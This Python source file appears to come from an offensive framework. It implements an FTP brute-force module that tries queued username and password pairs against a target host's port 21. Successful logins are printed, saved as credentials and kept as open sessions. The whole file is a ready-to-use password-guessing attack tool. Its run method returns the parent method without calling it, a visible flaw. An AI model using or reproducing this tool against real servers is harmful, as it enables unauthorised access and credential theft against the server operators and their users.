from jframework.modules.login._bruteforce import _Bruteforce
import ftplib
import sys


class Ftpbruteforce(_Bruteforce):

    def __init__(self):
        super(Ftpbruteforce,self).__init__()
        self.single_port = 21

    def worker(self):    
        while(not self.tasks_queue.empty()):
            ftp = ftplib.FTP()
            ftp.connect(host=self.host, port=self.single_port, timeout=2)
            task = self.tasks_queue.get()
            if task is None:
                break
            try:
                ftp.login(task["user"], task["password"])
                self.print_result(task["user"], task["password"], error=False)
                self.add_credential(task["user"], task["password"], "ftp")
                self.add_session(ftp, task["user"], "ftp")
            except Exception as e:
                if self.verb:
                    self.print_result(task["user"], task["password"], error=True)
                ftp.close()

            self.tasks_queue.task_done()

    def run(self):
        ftp = ftplib.FTP()
        try:
            ftp.connect(host=self.host, port=self.single_port, timeout=7)
        except:
            print("{} Connection problem.".format(self.host))
            return None, None
        ftp.close()

        return super(Ftpbruteforce, self).run
